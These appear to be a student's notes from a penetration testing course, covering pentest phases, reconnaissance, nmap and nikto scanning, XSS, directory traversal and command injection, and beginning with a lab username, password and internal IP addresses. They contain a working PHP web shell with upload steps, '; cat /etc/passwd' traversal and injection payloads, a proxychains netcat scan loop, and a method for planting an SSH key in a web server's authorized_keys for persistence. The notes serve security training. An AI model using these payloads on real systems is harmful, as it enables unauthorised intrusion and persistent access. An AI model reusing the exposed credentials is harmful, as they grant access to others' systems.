USER: SESA-005-M
PW: 3fGsPLvqbwPTrtU
HOSTMACHINE 14 : 10.50.23.41

Linux OPStation Float IP: 10.50.32.253  IP: 192.168.65.10

Windows OPStation Float IP: 10.50.38.37 IP: 192.168.65.20

DAY 1 ### PENETRATION TESTING ###
Types of PEN TESTING
Blackhat Penetration test
- No information
Whitehat Penetration test
- Start off with some information 

Penetration Test Reporting
Mission Definition (Phase 1)
- Define mission goals and targets
- Determine scope of mission (What is the purpose for this mission)
- Define RoE (Proper Engagement on targets/Legal lol)

Recon (Phase 2)
- Information gathering about the target through public sources
- Phishing attempts ( Unit/Company employers) 

Footprinting (Phase 3)
- Accumlate data through scanning and/or interaction with the target/target resources
- Scanning to see what hosts are up
- Nmap scans 

Exploitation and Inital Access (Phase 4)
- Gain an inital foothold on network
- check if port is what it says it is
- check websites for jump into

Post-Exploitation (Phase 5)
- Establish persistance
- Escalate privileges
- Cover your tracks
- Exfiltrate target data (PII or Money Investment stuff)

Document Mission (Phase 6)
Operation Notes
- To backtrack information you've already covered
- To make reporting after action reports easier
- To cover you bases easier with opnotes 

Penetration Test Reporting 
Executive Summary
hitting wavetops for CO type. just plan of action
Technical Summary
for SME who are on the team for the mission, What we need to do 

Penetration Test Reporting
Reasons to report
- let your employer in the loop of their networks 
What to report
- Malware or anything suspicious/
Screen captures
- Make sure opnotes are easy to read to pass onto next shift

Scanning and Reconnisance
Documentation
- Important for informing teammates, Tracking What you did
Collection and Use
- Collect anything that can be used 
Limitations and Collections
- Listen to ROE and lateral limits/legal team 


Data to Collect
Web Data
- Cached Content, Analytics
Sensitive Data
- Business Data, Profiles, Business Filings 
Publicly Accessible
Physical Addresses, Phone Numbers, Email Address, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
Twitter, Facebok, Instagram, People Searches, Registry and Wish List
Domain And IP Data
DNS Registration, IP Address Assignments, Geolocation Data, Whois

HTML Demo 

Advanced Scanning Techniques Demos 

Script Management
located in /usr/share/nmap/scripts

Google "Hack"
site:marines.mil
- Shows only websites with marines.mil
site:marines.mil <keyword>
site:marines.mil filetype:pdf "<Keyword>"

Vulnerability and Exploitation Research
- Transition from Recon to Weaponization
Research
- Open Source 
- See what available plan of action you have
Capabilities
- Mission Objectives drive requirements
   o Collection
   o Effects
- Additional functionality to fufill requirements 
- COMSEC (Make sure you are securing tech and communication between teams)
Testing
- Test in a sandbox environment
Plan
- Procure Hardware and Software
- Assign developer
- Assign a tester to develop TTPs and break it
- Document testing results
- testing environment

Wbsite to use for activities 
exploit-db.com
virustotal
-Don't Trust too much into it

for i in {96..128}; do proxychains nc -nvzw1 192.168.NetID.$i 22 53 80 135 137 139 445 2>&1 | grep OK | grep -Eo "192.168.NetID.:[0-9]" ;done

for i in {224..255}; do proxychainsnc -nvzwl 192.168.150.$i 1-1024 2>&1 | grep OK | grep -Eo "192.168.150.:[0-9]";done




DAY 2 and 3 ### WEB EXPLOITATION ###
Server/Client Relationship
- Server provides services 
- Client requests services 
- a Server can also be a client

HTTP Protocol
GET / Recieves information
POST / Sends information to web server
HEAD /
PUT /

HTTP Response Codes
10X == Informational
2XX == Success 
30X == Redirection
4XX == Client Error
5XX == Server Error

HTTP Packet Headers 
F12 and use the network tab 
HTTP Fields
- User-Agent
- Referer 
- Cookie
- Date
- Server 
- Set-Cookie

Wget
- Recursively download
- Recover from broken transfers
- SSL/TLS support
cURL
- Non recursive
- Can use pipes
- Upload ability
- Supports more protocols vs wget, such as scp and POP3

HTML is a framework for a website

JavaScript is able to change features on website

Enumeration 
robots.txt

nmap -v -sT -T5 --script http.enum.nse 10.50.31.75 shows (if robots.txt exist in website, also enumerates directories to find interesting events)

sudo apt install nikto -y (to get nikto)
nikto -h 10.50.31.75 **** Gives us information faster than other enumeration tools

Cross-Site Scripting
Client goes to trusted website, but website is compromised from JavaScript and since the client "trust" the website, the JavaScript can run on Client
Reflected XSS 
Is on the URL and is encoded with base64 or illegal URL characters
Stored XSS
Is in the server of the website, If client logs in exectuable will run

Server-Side injection

Directory Traversal/Path Traversal
Ability to read/execute outside web serverâ€™s directory
Uses ../../ (relative paths) in manipulating a server-side file path
view_image.php?file=../../etc/passwd
Use ; to run commands
; whoami
; cat ../../../../etc/passwd
; cat ../../../../etc/hosts
; cat ../../../../etc/profiles

Malicious File upload

Open a notepad to create a .php with
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>

save as a .php

upload .php file, navigate back to uploads

gives command shell on the text bar 
- cat /etc/passwd


Command Injection
Create ssh key
ssh-keygen -t rsa 
Generating public/private rsa key pair.

Grab public Key
student@lin-ops:~$ cd ~/.ssh
student@lin-ops:~/.ssh$ cat id_rsa.pub

find users home directory 
; cat /etc/passwd

Create directory for .ssh key 
; mkdir var/www/.ssh

echo ssh onto authorized keys
echo "key" >> /var/www/.ssh/authorized_keys

try ssh process again for test if it doesn't work


















